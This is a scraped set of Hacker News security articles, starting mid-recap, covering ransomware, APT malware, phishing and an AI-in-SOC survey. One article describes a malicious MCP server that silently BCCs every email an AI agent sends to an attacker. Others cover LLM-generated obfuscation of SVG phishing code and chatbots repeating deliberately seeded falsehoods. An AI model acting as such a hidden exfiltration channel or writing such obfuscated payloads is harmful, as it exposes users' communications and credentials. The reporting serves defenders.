Ransomware Groups Use Stolen AWS Keys to Breach Cloud — Ransomware gangs are using Amazon Web Services (AWS) keys stored in local environments, such as Veeam backup servers, to pivot to a victim's AWS account and steal data with the help of the Pacu AWS exploitation framework, turning what started as an on-premise event into a cloud compromise. ""Threat actors are becoming increasingly adept at exploiting cloud environments — leveraging compromised AWS keys, targeting backup servers, and using advanced attack frameworks to evade detection,"" Varonis said.
Meta Unveils Ad-Free Option in the U.K. — Meta has launched an ad-free experience for Facebook and Instagram in the U.K., allowing users to pay £2.99 a month to access the platforms without ads on the web, and £3.99 a month for Android and iOS. ""We will notify UK users over the age of 18 that they have the choice to subscribe to Facebook and Instagram for a fee to use these services without seeing ads,"" the company said. ""A reduced, additional fee of £2/month on the web or £3/month on iOS and Android will automatically apply for each additional account listed in a user's Account Center."" Meta has significant hurdles in rolling out the scheme in the E.U., causing it to walk back its ad model, offering users the choice to receive ""less personalized ads"" that are full-screen and temporarily unskippable. Earlier this May, the European Commission said the model does not comply with the Digital Markets Act (DMA) and fined Meta €200 million. In response, the company said it would need to make modifications to the model that ""could result in a materially worse user experience for European users and a significant impact."" In a report published in July 2025, privacy non-profit noyb said: ""'Pay or Okay' has spread throughout the E.U. in recent years and can now be found on hundreds of websites. However, data protection authorities still haven't adopted a consistent E.U.-wide approach to deal with these systems. They should have agreed on this long ago.""
Dutch Teen Duo Arrested Over Alleged 'Wi-Fi Sniffing' for Russia — Two teenagers have been arrested in the Netherlands on suspicion of espionage, reportedly on behalf of Russian intelligence agencies. The boys, both aged 17, were arrested on Monday. One has been remanded in custody while the other has been released on home bail. The arrests are related to laws regarding state-sponsored interference, but additional details have been withheld due to the age of the suspects and the ongoing investigation. The teens are alleged to have been tasked with carrying a ""Wi-Fi sniffer"" along a route past buildings in The Hague, including the headquarters of Europol and Eurojust, as well as several embassies.
Akira Ransomware Breaching MFA-Protected SonicWall VPN Accounts — Cybersecurity researchers have warned about an ""aggressive"" Akira ransomware campaign targeting SonicWall VPNs to rapidly deploy the locker as part of an attack wave that began on July 21, 2025. ""In almost all intrusions, ransomware encryption took place in under four hours from initial access, with a staging interval as short as 55 minutes in some instances,"" Arctic Wolf said in a new report. Other commonly observed post-exploitation activities include internal network scanning, Impacket SMB activity tied to discovery, Active Directory discovery, and VPN client logins originating from Virtual Private Server (VPS) hosting providers. Targeting firewall and LDAP-synchronized, several intrusions have involved the threat actors leveraging the dedicated account used for Active Directory synchronization to log in via SSL VPN, despite not being intentionally configured for such access. In more than 50% of the analyzed intrusions, login attempts were observed against accounts with the One Time Password (OTP) feature enabled. ""Malicious logins were followed within minutes by port scanning, Impacket SMB activity, and rapid deployment of Akira ransomware,"" the company noted. ""Victims spanned across multiple sectors and organization sizes, suggesting opportunistic mass exploitation.""
Four People to Face Trial Over Greece Spyware Scandal — Four individuals, two Israeli and two Greek employees of spyware vendor Intellect, are expected to face trial in Greece over the use of the Predator surveillance tool by the ruling government in 2022 to eavesdrop on judges, senior military officers, journalists, and the opposition. But to date, no government officials have been charged in connection with the scandal.
Phishing Emails Lead to DarkCloud Stealer — The information stealer known as DarkCloud is being distributed via phishing emails masquerading as financial correspondence that trick recipients into opening malicious ZIP archives. The stealer, besides adding new layers of encryption and evasion, targets web browser data, keystrokes, FTP credentials, clipboard contents, email clients, files, and cryptocurrency wallets. Stolen credentials/data are sent to attacker-controlled Telegram, FTP, SMTP, or Web Panel (PHP) endpoints. It's marketed on Telegram by a user named @BluCoder and on the clearnet through the domain darkcloud.onlinewebshop[.]net. It's advertised as the ""best surveillance software for parents, spouses, and employers."" Cybersecurity company eSentire said: ""DarkCloud is an information-stealing malware written in VB6 and is actively being updated to target a wide range of applications, including email clients, FTP clients, cryptocurrency wallets, web browsers and supports numerous other information-stealing capabilities like keystroke/clipboard harvesting, clipboard hijacking, and file collection.""
Nupay Plugs ""Configuration Gap"" — Indian fintech company Nupay said it addressed a configuration gap after UpGuard flagged an unprotected Amazon S3 storage bucket containing more than 270,000 documents related to bank transfers of Indian customers. The exposed information included bank account numbers, transaction amounts, names, phone numbers, and email addresses. The data was linked to at least 38 different banks and financial institutions. It's currently not known how long the data was left publicly accessible on the internet, although misconfigurations of this kind are not uncommon. Nupay told TechCrunch the bucket exposed a ""limited set of test records with basic customer details,"" and that a majority of the details were ""dummy or test files.""
Top AI Chatbots Provide Answers with False Claims — Some of the top AI chatbots' tendency to repeat false claims on topics in the news increased nearly twice as much as they did last year, according to an audit by NewsGuard. The disinformation rates of the chatbots have almost doubled, going from 18% in August 2024 to 35% a year later, with the tools providing false claims to news prompts more than one-third of the time. ""Instead of citing data cutoffs or refusing to weigh in on sensitive topics, the LLMs now pull from a polluted online information ecosystem — sometimes deliberately seeded by vast networks of malign actors, including Russian disinformation operations — and treat unreliable sources as credible,"" it said.
Israel's PM Says His U.N. Speech Streamed Directly to Gaza Cellphones — Israeli Prime Minister Benjamin Netanyahu said his speech at the United Nations last week was also pushed to mobile phones of Gaza residents in an unprecedented operation. ""Ladies and gentlemen, thanks to special efforts by Israeli intelligence, my words are now also being carried,"" Netanyahu said. ""They're streamed live through the cell phones of Gaza."" There is no evidence for how it would've worked or if this actually took place.
Fake Teams Installers Lead to Oyster Malware — Threat actors are abusing SEO poisoning and malvertising to lure users searching for Teams online into downloading a fake installer that leads to malware called Oyster (aka Broomstick or CleanUpLoader). ""Oyster is a modular, multistage backdoor that provides persistent remote access, establishes Command and Control (C2) communications, collects host information, and enables the delivery of follow-on payloads,"" Blackpoint said. ""By hiding behind a widely used collaboration platform, Oyster is well positioned to evade casual detection and blend into the noise of normal enterprise activity."" The activity has been attributed by Conscia to Vanilla Tempest (aka Storm-0832 or Vice Society).
Flaw in Streamlit Framework Patched — Cybersecurity researchers discovered a vulnerability in the Streamlit app deployment framework that can allow attackers to hijack underlying cloud servers. ""To do that, threat actors bypass file type restrictions and take full control of a misconfigured cloud instance running Streamlit applications,"" Cato Networks said. In a hypothetical attack scenario, bad actors can exploit a file upload vulnerability in the framework to rewrite server files and deploy new SSH configurations. Streamlit released a security patch in March.

🔒 Tip of the Week
Hardening Active Directory Against Modern Attacks — Active Directory is a prime target—compromise it and attackers can own your network. Strengthen its defenses starting with Kerberos FAST (Flexible Authentication Secure Tunneling), which encrypts pre-authentication traffic to block offline password cracking and relay attacks. Deploy it in ""Supported"" mode, monitor KDC events (IDs 34, 35), then enforce ""Required"" once all clients are ready.
Run PingCastle for a rapid forest health check and use ADeleg/ADeleginator to uncover dangerous over-delegation in OUs or service accounts. Harden password security with Fine-Grained Password Policies (FGPP) and automate local admin password rotation using LAPS or Lithnet Password Protection to block breached credentials in real time.
Tighten other control layers: use AppLocker Inspector/Gen to lock down application execution and GPOZaurr to detect orphaned or risky Group Policy Objects. Scan AD Certificate Services with Locksmith to close misconfigurations and use ScriptSentry to catch malicious logon scripts that enable stealthy persistence.
Finally, apply CIS or Microsoft security baselines and generate custom Attack Surface Reduction rules with ASRGen to block exploit techniques that bypass standard policies. This layered, rarely implemented strategy raises the cost of compromise and forces even advanced adversaries to work far harder.

2025-10-06 11:12:02,"Sep 29, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/the-state-of-ai-in-soc-2025-insights.html,The State of AI in the SOC 2025 - Insights from Recent Study,"Security leaders are embracing AI for triage, detection engineering, and threat hunting as alert volumes and burnout hit breaking points.
A comprehensive survey of 282 security leaders at companies across industries reveals a stark reality facing modern Security Operations Centers: alert volumes have reached unsustainable levels, forcing teams to leave critical threats uninvestigated. You can download the full report here. The research, conducted primarily among US-based organizations, shows that AI adoption in security operations has shifted from experimental to essential as teams struggle to keep pace with an ever-growing stream of security alerts.
The findings paint a picture of an industry at a tipping point, where traditional SOC models are buckling under operational pressure and AI-powered solutions are emerging as the primary path forward.
Alert Volume Reaches Breaking Point
Security teams are drowning in alerts, with organizations processing an average of 960 alerts per day. Large enterprises face an even more daunting reality, handling over 3,000 daily alerts from an average of 30 different alert-generating security tools. 
This volume creates a fundamental operational crisis where security teams must make difficult detection and investigation decisions under extreme time pressure. The survey reveals that alert fatigue has evolved beyond an emotional burden to become a measurable operational risk.

Investigations Remain Slow and Manual
The sheer mathematics of alert processing exposes the problem's scale. The survey results revealed that it takes an average of 70 minutes to fully investigate an alert, that is, if someone can find the time to look at it. According to the survey, a full 56 minutes pass on average before anyone acts on an alert. This impossibility forces difficult choices about which alerts receive attention and which get ignored.
The survey results have unequivocally demonstrated a critical and well-known challenge within Security Operations Centers (SOCs): the sheer volume of alerts generated daily far exceeds the capacity of human analysts to investigate them thoroughly. Compounding the problem, modern security stacks and data sources continue to grow in number and complexity, leading to longer investigation times.

For high-priority incidents requiring immediate attention, these timeframes represent unacceptable delays that can compound breach severity. According to the latest CrowdStrike Cyber Threat Report, it only takes 48 minutes on average for a cyber threat like a Business Email Compromise to result in an incident. 
The Hidden Cost of Overwhelmed SOCs
This overwhelming influx creates an impossible dilemma, forcing SOC teams to make difficult and often risky choices about which alerts receive attention and which are, by necessity, ignored. The consequence of this impossible situation is a heightened risk of missing genuine threats amidst the noise, ultimately compromising an organization's security posture.
40% of security alerts go completely uninvestigated due to volume and resource constraints. Even more troubling, 61% of security teams admitted to ignoring alerts that later proved to be critical security incidents. 


This statistic represents a fundamental breakdown in security operations. Teams designed to protect organizations are systematically unable to examine nearly half of the potential threats they detect. The survey reveals that this isn't negligence but rather a forced adaptation to impossible workload demands.
SOC Teams Struggle with 24/7 Operations
The survey exposes critical gaps in round-the-clock security coverage. Many organizations lack sufficient staffing to maintain effective 24/7 SOC operations, creating vulnerability windows during off-hours when skeleton crews handle the same alert volumes that overwhelm full-strength day shifts.
Analyst burnout has become a quantifiable problem rather than just an HR concern. Teams report that suppressing detection rules has become a default coping mechanism when alert volumes become unmanageable. This approach reduces immediate workload but potentially creates blind spots in security coverage.
The staffing challenges are compounded by the specialized nature of security analysis work. Organizations cannot easily scale their teams to match alert volume growth, particularly given the shortage of experienced cybersecurity professionals in the current job market.

AI transitions from experiment to strategic priority
AI for security operations has rapidly climbed the priority ladder, now ranking as a top-three initiative alongside core security programs like cloud security and data security. This signals a fundamental shift in how security leaders view AI as a critical enabler for operational success today.
Currently, 55% of security teams already deploy AI copilots and assistants in production to support alert triage and investigation workflows. 
The next wave of adoption is coming fast. Among teams not yet using AI, 60% plan to evaluate AI-powered SOC solutions within the year. And looking ahead, 60% of all SOC workloads are expected to be handled by AI in the next three years, according to the survey. 

Organizations seek AI for core investigative tasks
Security teams have identified where AI can make the biggest immediate difference. Triage tops the list at 67%, followed closely by detection tuning (65%) and threat hunting (64%).
These priorities reflect a growing desire to apply AI to the early stages of investigation and surfacing meaningful alerts while providing initial context, and offloading repetitive analysis. It's not about automating away human judgment, but about accelerating workflows and sharpening human focus.
Barriers Remain but Momentum is Clear
Despite strong adoption intentions, security leaders identify meaningful barriers to AI implementation. Data privacy concerns, integration complexity, and explainability requirements top the list of organizational hesitations.

The Future SOC Takes Shape
The survey data reveals a clear trajectory toward hybrid security operations where AI handles routine analysis tasks and human analysts focus on complex investigations and strategic decision-making. This evolution promises to address both the volume problem and analyst burnout simultaneously.
Success metrics for this transformation will likely center on operational efficiency improvements. Organizations will measure progress through reduced Mean Time to Investigation (MTTI) and Mean Time to Response (MTTR) in addition to traditional alert closure rates. Other meaningful success metrics include using AI to upskill and train new SOC Analyst and dramatically accelerate ramp up time.
By ensuring comprehensive alert coverage through AI augmentation, organizations can reduce the risk tolerance currently forced by volume constraints. The future SOC will investigate more alerts more thoroughly while requiring less manual effort from human analysts.

2025-10-06 11:12:06,"Sep 29, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/microsoft-flags-ai-driven-phishing-llm.html,Microsoft Flags AI-Driven Phishing: LLM-Crafted SVG Files Outsmart Email Security,"Microsoft is calling attention to a new phishing campaign primarily aimed at U.S.-based organizations that has likely utilized code generated using large language models (LLMs) to obfuscate payloads and evade security defenses.
""Appearing to be aided by a large language model (LLM), the activity obfuscated its behavior within an SVG file, leveraging business terminology and a synthetic structure to disguise its malicious intent,"" the Microsoft Threat Intelligence team said in an analysis published last week.
The activity, detected on August 28, 2025, shows how threat actors are increasingly adopting artificial intelligence (AI) tools into their workflows, often with the goal of crafting more convincing phishing lures, automating malware obfuscation, and generating code that mimics legitimate content.
In the attack chain documented by the Windows maker, bad actors have been observed leveraging an already compromised business email account to send phishing messages to steal victims' credentials. The messages feature lure masquerading as a file-sharing notification to entice them into opening what ostensibly appears to be a PDF document, but, in reality, is a Scalable Vector Graphics (SVG) file.
What's notable about the messages is that the attackers make use of a self-addressed email tactic, where the sender and recipient addresses match, and the actual targets were hidden in the BCC field so as to bypass basic detection heuristics.

""SVG files (Scalable Vector Graphics) are attractive to attackers because they are text-based and scriptable, allowing them to embed JavaScript and other dynamic content directly within the file,"" Microsoft said. ""This makes it possible to deliver interactive phishing payloads that appear benign to both users and many security tools.""
On top of that, the fact that SVG file format supports features such as invisible elements, encoded attributes, and delayed script execution makes it ideal for adversaries looking to sidestep static analysis and sandboxing, it added.
The SVG file, once launched, redirects the user to a page that serves a CAPTCHA for security verification, completing which, they are likely taken to a fake login page to harvest their credentials. Microsoft said the exact next stage is unclear due to its systems flagging and neutralizing the threat.
But where the attack stands apart is when it comes to its unusual obfuscation approach that uses business-related language to disguise the phishing content in the SVG file -- a sign that it may have been generated using an LLM.

Conversion of business terminology to processable malicious code
""First, the beginning of the SVG code was structured to look like a legitimate business analytics dashboard,"" Microsoft said. ""This tactic is designed to mislead anyone casually inspecting the file, making it appear as if the SVG's sole purpose is to visualize business data. In reality, though, it's a decoy.""
The second aspect is that the payload's core functionality – which is to redirect users to the initial phishing landing page, trigger browser fingerprinting, and initiate session tracking – is also obscured using a long sequence of business-related terms such as revenue, operations, risk, quarterly, growth, or shares.
Microsoft said it ran the code against its Security Copilot, which found that the program was ""not something a human would typically write from scratch due to its complexity, verbosity, and lack of practical utility."" Some of the indicators it used to arrive at the conclusion include the use of -

Overly descriptive and redundant naming for functions and variables
Highly modular and over-engineered code structure
Generic and verbose comments
Formulaic techniques to achieve obfuscation using business terminology
CDATA and XML declaration in the SVG file, likely in an attempt to mimic documentation examples

""While this campaign was limited in scope and effectively blocked, similar techniques are increasingly being leveraged by a range of threat actors,"" Microsoft said. 
The disclosure comes as Forcepoint detailed a multi-stage attack sequence that uses phishing emails with .XLAM attachments to execute shellcode that ultimately deploys XWorm RAT by means of a secondary payload, while simultaneously displaying a blank or corrupted Office file as a ruse. The secondary payload functions as a conduit to load a .DLL file in memory.

""The second stage .DLL file from memory uses heavily obfuscated packing and encryption techniques,"" Forcepoint said. ""This second stage .DLL file loaded another .DLL file in memory again using reflective DLL injection which was further responsible for final execution of malware.""
""The next and final step performs a process injection in its own main executable file, maintaining persistence and exfiltrating data to its command-and-control servers. The C2s where data was exfiltrated was found to be related to XWorm family.""

In recent weeks, phishing attacks have also employed lures related to the U.S. Social Security Administration and copyright infringement to distribute ScreenConnect ConnectWise and information stealers such as Lone None Stealer and PureLogs Stealer, respectively, per Cofense.
""The campaign typically spoofs various legal firms claiming to request the takedown of copyright-infringing content on the victim's website or social media page,"" the email security company said of the second set of attacks. ""This campaign is notable for its novel use of a Telegram bot profile page to deliver its initial payload, obfuscated compiled Python script payloads, and evolving complexity as seen through multiple iterations of campaign samples."""
2025-10-06 11:12:07,"Sep 29, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html,First Malicious MCP Server Found Stealing Emails in Rogue Postmark-MCP Package,"Cybersecurity researchers have discovered what has been described as the first-ever instance of a malicious Model Context Protocol (MCP) server spotted in the wild, raising software supply chain risks.
According to Koi Security, a legitimate-looking developer managed to slip in rogue code within an npm package called ""postmark-mcp"" that copied an official Postmark Labs library of the same name. The malicious functionality was introduced in version 1.0.16, which was released on September 17, 2025.
The actual ""postmark-mcp"" library, available on GitHub, exposes an MCP server to allow users to send emails, access and use email templates, and track campaigns using artificial intelligence (AI) assistants.

The npm package in question has since been deleted from npm by the developer ""phanpak,"" who uploaded it to the repository on September 15, 2025, and maintains 31 other packages. The JavaScript library attracted a total of 1,643 downloads.
""Since version 1.0.16, it's been quietly copying every email to the developer's personal server,"" Koi Security Chief Technology Officer Idan Dardikman said. ""This is the world's first sighting of a real-world malicious MCP server. The attack surface for endpoint supply chain attacks is slowly becoming the enterprise's biggest attack surface.""

The malicious package is a replica of the original library, save for a one-line change added in version 1.0.16 that essentially forwards every email sent using the MCP server to the email address ""phan@giftshop[.]club"" by BCC'ing it, potentially exposing sensitive communications.
""The postmark-mcp backdoor isn't sophisticated – it's embarrassingly simple,"" Dardikman said. ""But it perfectly demonstrates how completely broken this whole setup is. One developer. One line of code. Thousands upon thousands of stolen emails.""
Developers who have installed the npm package are recommended to immediately remove it from their workflows, rotate any credentials that may have been exposed through email, and review email logs for BCC traffic to the reported domain.

""MCP servers typically run with high trust and broad permissions inside agent toolchains. As such, any data they handle can be sensitive (password resets, invoices, customer communications, internal memos, etc.),"" Snyk said. ""In this case, the backdoor in this MCP Server was built with the intention to harvest and exfiltrate emails for agentic workflows that relied on this MCP Server.""
The findings illustrate how threat actors continue to abuse the user trust associated with the open-source ecosystem and the nascent MCP ecosystem to their advantage, especially when they are rolled out in business critical environments without adequate guardrails.
Update
In a statement, Postmark said the npm package ""postmark-mcp"" was not official, and that a malicious actor created a fake package on npm impersonating its name to steal email data.""We didn't develop, authorize, or have any involvement with the 'postmark-mcp' npm package,"" the email delivery platform said. ""The legitimate Postmark API and services remain secure and unaffected by this incident."""
2025-10-06 11:12:09,"Sep 27, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/china-linked-plugx-and-bookworm-malware.html,China-Linked PlugX and Bookworm Malware Attacks Target Asian Telecom and ASEAN Networks,"Telecommunications and manufacturing sectors in Central and South Asian countries have emerged as the target of an ongoing campaign distributing a new variant of a known malware called PlugX (aka Korplug or SOGU).
""The new variant's features overlap with both the RainyDay and Turian backdoors, including abuse of the same legitimate applications for DLL side-loading, the XOR-RC4-RtlDecompressBuffer algorithm used to encrypt/decrypt payloads and the RC4 keys used,"" Cisco Talos researchers Joey Chen and Takahiro Takeda said in an analysis published this week.
The cybersecurity company noted that the configuration associated with the PlugX variant diverges significantly from the usual PlugX configuration format, instead adopting the same structure used in RainyDay, a backdoor associated with a China-linked threat actor known as Lotus Panda (aka Naikon APT). It's also likely tracked by Kaspersky as FoundCore and attributed to a Chinese-speaking threat group it calls Cycldek.

PlugX is a modular remote access trojan (RAT) widely used by many China-aligned hacking groups, but most prominently by Mustang Panda (aka BASIN, Bronze President, Camaro Dragon, Earth Preta, HoneyMyte, RedDelta, Red Lich, Stately Taurus, TEMP.Hex, and Twill Typhoon).
Turian (aka Quarian or Whitebird), on the other hand, is assessed to be a backdoor exclusively employed in cyber attacks targeting the Middle East by another advanced persistent threat (APT) group with ties to China referred to as BackdoorDiplomacy (aka CloudComputating or Faking Dragon).
The victimology patterns – particularly the focus on telecommunications companies – and technical malware implementation had yielded evidence suggesting likely connections between Lotus Panda and BackdoorDiplomacy, raising the possibility that either the two clusters are one and the same, or that they are obtaining their tools from a common vendor.
In one incident detected by the company, Naikon is said to have targeted a telecom firm in Kazakhstan, a country that shares its borders with Uzbekistan, which has been previously singled out by BackdoorDiplomacy. What's more, both hacking crews have been found to zero in on South Asian countries.


The attack chains essentially involve abusing a legitimate executable associated with Mobile Popup Application to sideload a malicious DLL that's then used to decrypt and launch PlugX, RainyDay, and Turian payloads in memory. Recent attack waves orchestrated by the threat actor have heavily leaned on PlugX, which uses the same configuration structure as RainyDay and includes an embedded keylogger plugin.
""While we cannot conclude that there is a clear connection between Naikon and BackdoorDiplomacy, there are significant overlapping aspects – such as the choice of targets, encryption/decryption payload methods, encryption key reuse and use of tools supported by the same vendor,"" Talos said. ""These similarities suggest a medium confidence link to a Chinese-speaking actor in this campaign.""
Mustang Panda's Bookworm Malware Detailed
The disclosure comes as Palo Alto Networks Unit 42 shed light on the inner workings of the Bookworm malware used by the Mustang Panda actor since 2015 to gain extensive control over compromised systems. The advanced RAT comes fitted with capabilities to execute arbitrary commands, upload/download files, exfiltrate data, and establish persistent access.
Earlier this March, the cybersecurity vendor said it identified attacks targeting countries affiliated with the Association of Southeast Asian Nations (ASEAN) to distribute the malware.

Bookworm utilizes legitimate-looking domains or compromised infrastructure for C2 purposes so as to blend in with normal network traffic. Select variants of the malware have also been found to share overlaps with TONESHELL, a known backdoor associated with Mustang Panda since late 2022.
Like PlugX and TONESHELL, attack chains distributing Bookworm rely on DLL side-loading for payload execution, although newer variants have embraced a technique that involves packaging shellcode as universally unique identifier (UUID) strings, which are then decoded and executed.
""Bookworm is known for its unique modular architecture, allowing its core functionality to be expanded by loading additional modules directly from its command-and-control (C2) server,"" Unit 42 researcher Kyle Wilhoit said. ""This modularity makes static analysis more challenging, as the Leader module relies on other DLLs to provide specific functionality.""
""This deployment and adaptation of Bookworm, running in parallel with other Stately Taurus operations, showcases its long-term role in the actor's arsenal. It also points to a sustained, long-term commitment to its development and use by the group."""
2025-10-06 11:12:12,"Sep 26, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/researchers-expose-svg-and-purerat.html,Researchers Expose Phishing Threats Distributing CountLoader and PureRAT,"A new campaign has been observed impersonating Ukrainian government agencies in phishing attacks to deliver CountLoader, which is then used to drop Amatera Stealer and PureMiner.
""The phishing emails contain malicious Scalable Vector Graphics (SVG) files designed to trick recipients into opening harmful attachments,"" Fortinet FortiGuard Labs researcher Yurren Wan said in a report shared with The Hacker News.
In the attack chains documented by the cybersecurity company, the SVG files are used to initiate the download of a password-protected ZIP archive, which contains a Compiled HTML Help (CHM) file. The CHM file, when launched, activates a chain of events that culminate in the deployment of CountLoader. The email messages claim to be a notice from the National Police of Ukraine.
CountLoader, which was the subject of a recent analysis by Silent Push, has been found to drop various payloads like Cobalt Strike, AdaptixC2, and PureHVNC RAT. In this attack chain, however, it serves as a distribution vector for Amatera Stealer, a variant of ACRStealer, and PureMiner, a stealthy .NET cryptocurrency miner.


It's worth pointing out that both PureHVNC RAT and PureMiner are part of a broader malware suite developed by a threat actor known as PureCoder. Some of the other products from the same author include -

PureCrypter, a crypter for Native and .NET
PureRAT (aka ResolverRAT), a successor to PureHVNC RAT
PureLogs, an information stealer and logger
BlueLoader, a malware that can act as a botnet by downloading and executing payloads remotely
PureClipper, a clipper malware that substitutes cryptocurrency addresses copied into the clipboard with attacker-controlled wallet addresses to redirect transactions and steal funds

According to Fortinet, Amatera Stealer and PureMiner are both deployed as fileless threats, with the malware ""executed via .NET Ahead-of-Time (AOT) compilation with process hollowing or loaded directly into memory using PythonMemoryModule.""

Amatera Stealer, once launched, gathers system information, collects files matching a predefined list of extensions, and harvests data from Chromium- and Gecko-based browsers, as well as applications like Steam, Telegram, FileZilla, and various cryptocurrency wallets.
""This phishing campaign demonstrates how a malicious SVG file can act as an HTML substitute to initiate an infection chain,"" Fortinet said. In this case, attackers targeted Ukrainian government entities with emails containing SVG attachments. The SVG-embedded HTML code redirected victims to a download site.""

The development comes as Huntress uncovered a likely Vietnamese-speaking threat group using phishing emails bearing copyright infringement notice themes to trick recipients into launching ZIP archives that lead to the deployment of PXA Stealer, which then evolves into a multi-layered infection sequence dropping PureRAT.

""This campaign demonstrates a clear and deliberate progression, starting with a simple phishing lure and escalating through layers of in-memory loaders, defense evasion, and credential theft,"" security researcher James Northey said. ""The final payload, PureRAT, represents the culmination of this effort: a modular, professionally developed backdoor that gives the attacker complete control over a compromised host.""
""Their progression from amateurish obfuscation of their Python payloads to abusing commodity malware like PureRAT shows not just persistence, but also hallmarks of a serious and maturing operator."""
2025-10-06 11:12:14,"Sep 26, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/new-coldriver-malware-campaign-joins-bo.html,New COLDRIVER Malware Campaign Joins BO Team and Bearlyfy in Russia-Focused Cyberattacks,"The Russian advanced persistent threat (APT) group known as COLDRIVER has been attributed to a fresh round of ClickFix-style attacks designed to deliver two new ""lightweight"" malware families tracked as BAITSWITCH and SIMPLEFIX.
Zscaler ThreatLabz, which detected the new multi-stage ClickFix campaign earlier this month, described BAITSWITCH as a downloader that ultimately drops SIMPLEFIX, a PowerShell backdoor.
COLDRIVER, also tracked as Callisto, Star Blizzard, and UNC4057, is the moniker assigned to a Russia-linked threat actor that's known to target a wide range of sectors since 2019. While early campaign waves were observed using spear-phishing lures to direct targets to credential harvesting pages, the group has been fleshing out its arsenal with custom tools like SPICA and LOSTKEYS, which underscores its technical sophistication.
The adversary's use of ClickFix tactics was previously documented by the Google Threat Intelligence Group (GTIG) back in May 2025, using fake sites serving fake CAPTCHA verification prompts to trick the victim into executing a PowerShell command that's designed to deliver the LOSTKEYS Visual Basic Script.

""The continued use of ClickFix suggests that it is an effective infection vector, even if it is neither novel nor technically advanced,"" Zscaler security researchers Sudeep Singh and Yin Hong Chang said in a report published this week.

The latest attack chain follows the same modus operandi, tricking unsuspecting users into running a malicious DLL in the Windows Run dialog under the guise of completing a CAPTCHA check. The DLL, BAITSWITCH, reaches out to an attacker-controlled domain (""captchanom[.]top"") to fetch the SIMPLEFIX backdoor, while a decoy document hosted on Google Drive is presented to the victims.
It also makes several HTTP requests to the same server to send system information, receive commands to establish persistence, store encrypted payloads in the Windows Registry, download a PowerShell stager, clear the most recent command executed in the Run dialog, effectively erasing traces of the ClickFix attack that triggered the infection.
The downloaded PowerShell stager subsequently reaches out to an external server (""southprovesolutions[.]com"") to download SIMPLEFIX, which, in turn, establishes communication with a command-and-control (C2) server to run PowerShell scripts, commands, and binaries hosted on remote URLs.

One of the PowerShell scripts executed via SIMPLEFIX exfiltrates information about a hard-coded list of file types found in a pre-configured list of directories. The list of directories and file extensions scanned shares overlaps with that of LOSTKEYS.
""The COLDRIVER APT group is known for targeting members of NGOs, human right defenders, think tanks in Western regions, as well as individuals exiled from and residing in Russia,"" Zscaler said. ""The focus of this campaign closely aligns with their victimology, which targets members of civil society connected to Russia.""
BO Team and Bearlyfy Target Russia
The development comes as Kaspersky said it observed a new phishing campaign targeting Russian companies in early September undertaken by the BO Team group (aka Black Owl, Hoody Hyena, and Lifting Zmiy) using password-protected RAR archives to deliver a new version of BrockenDoor rewritten in C# and an updated version of ZeronetKit.
A Golang backdoor, ZeronetKit, comes fitted with capabilities to support remote access to compromised hosts, upload/download files, execute commands using cmd.exe, and create a TCP/IPv4 tunnel. Select newer versions also incorporate support for downloading and running shellcode, as well as update the communication interval with C2 and modify the C2 server list.
""ZeronetKit is unable to independently persist on an infected system, so attackers use BrockenDoor to copy the downloaded backdoor to startup,"" the Russian cybersecurity vendor said.
It also follows the emergence of a new group called Bearlyfy that has used ransomware strains like LockBit 3.0 and Babuk in attacks targeting Russia, initially attacking smaller companies for smaller ransoms before graduating to bigger firms in the country starting April 2025, according to F6. As of August 2025, the group is estimated to have claimed at least 30 victims.

In one incident targeting a consulting company, the threat actors have been observed weaponizing a vulnerable version of Bitrix for initial access, followed by using the Zerologon flaw to escalate privileges. In another case observed in July, the initial access is said to have been facilitated through an unnamed partner company.
""In the most recent recorded attack, the attackers demanded €80,000 in cryptocurrency, while in the first attack, the ransom was several thousand dollars,"" F6 researchers said. ""Due to the relatively low ransom amounts, on average, every fifth victim buys decryptors from the attackers.""
Bearlyfy is assessed to be active since January 2025, with a deeper analysis of its tools uncovering infrastructure overlaps with a likely pro-Ukrainian threat group called PhantomCore, which has a track record of targeting Russian and Belarusian companies since 2022. Despite these similarities, Bearlyfy is believed to be an autonomous entity.
""PhantomCore implements complex, multi-stage attacks typical of APT campaigns,"" the company said. ""Bearlyfy, on the other hand, uses a different model: attacks with minimal preparation and a targeted focus on achieving an immediate effect. Initial access is achieved through exploitation of external services and vulnerable applications. The primary toolkit is aimed at encryption, destruction, or modification of data."""
2025-10-06 11:12:15,"Sep 26, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/crash-tests-for-security-why-bas-is.html,"Crash Tests for Security: Why BAS Is Proof of Defense, Not Assumptions","Car makers don't trust blueprints. They smash prototypes into walls. Again and again. In controlled conditions.
Because design specs don't prove survival. Crash tests do. They separate theory from reality. Cybersecurity is no different. Dashboards overflow with ""critical"" exposure alerts. Compliance reports tick every box. 
But none of that proves what matters most to a CISO:

The ransomware crew targeting your sector can't move laterally once inside.
That a newly published exploit of a CVE won't bypass your defenses tomorrow morning.
That sensitive data can't be siphoned through a stealthy exfiltration channel, exposing the business to fines, lawsuits, and reputational damage.

That's why Breach and Attack Simulation (BAS) matters. 
BAS is the crash test for your security stack. It safely simulates real adversarial behaviors to prove which attacks your defenses can stop, and which would break through. It exposes those gaps before attackers exploit them or regulators demand answers.
The Illusion of Safety: Dashboards Without Crash Tests
Dashboards overflowing with exposures can feel reassuring, like you're seeing everything, like you're safe. But it's a false comfort. It's no different than reading a car's spec sheet and declaring it ""safe"" without ever crashing it into a wall at 60 miles per hour. On paper, the design holds. In practice, impact reveals where the frame buckles and the airbags fail.
The Blue Report 2025 provides crash test data for enterprise security. Based on 160 million adversary simulations, it shows what actually happens when defenses are tested instead of assumed:

Prevention dropped from 69% to 62% in one year. Even organizations with mature controls regressed.
54% of attacker behaviors generated no logs. Entire attack chains unfolded with zero visibility.
Only 14% triggered alerts. Meaning most detection pipelines failed silently.
Data exfiltration was stopped just 3% of the time. A stage with direct financial, regulatory, and reputational consequences is effectively unprotected.


These are not gaps dashboards reveal. They are exploitable weaknesses that only appear under pressure. 
Just as a crash test exposes flaws hidden in design blueprints, security validation exposes the assumptions that collapse under real-world impact, before attackers, regulators, or customers do.

BAS Works as a Security Validation Engine
